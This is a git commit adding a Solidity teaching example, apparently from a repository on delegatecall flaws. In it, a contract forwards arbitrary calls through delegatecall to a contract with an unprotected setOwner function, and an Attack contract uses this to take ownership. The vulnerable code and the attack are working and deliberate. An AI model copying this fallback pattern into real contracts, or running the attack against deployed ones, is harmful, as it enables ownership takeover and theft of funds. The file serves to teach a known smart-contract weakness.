2daa507c76e62f79bde7ac2897541bfad0781254
Yaghoub Adelzadeh <adelzadeh74@gmail.com>
2024-06-07 23:54:36 +0330

    Update Example1.sol

--- Delegate-Call/Example1.sol
+++ Delegate-Call/Example1.sol
@@ -1,1 +1,37 @@
+// SPDX-License-Identifier: MIT
+
+pragma solidity ^0.8.20;
+
+contract First {
+    address public owner;
+
+    function setOwner () public {
+        owner = msg.sender;
+    }
+}
+
+contract Second {
+    address public owner;
+    First public first;
+
+    constructor (First _first) {
+        first = First (_first);
+    }
+
+    fallback () external payable {
+        address (first).delegatecall(msg.data);
+    }
+}
+// Attacker can be owner of Second contract with calling attack function!
+contract Attack {
+    address public second;
+    
+    constructor (address _second) {
+        second = _second;
+    }
+
+    function attack () public {
+        second.call(abi.encodeWithSignature("setOwner()"));
+    }
+}
 
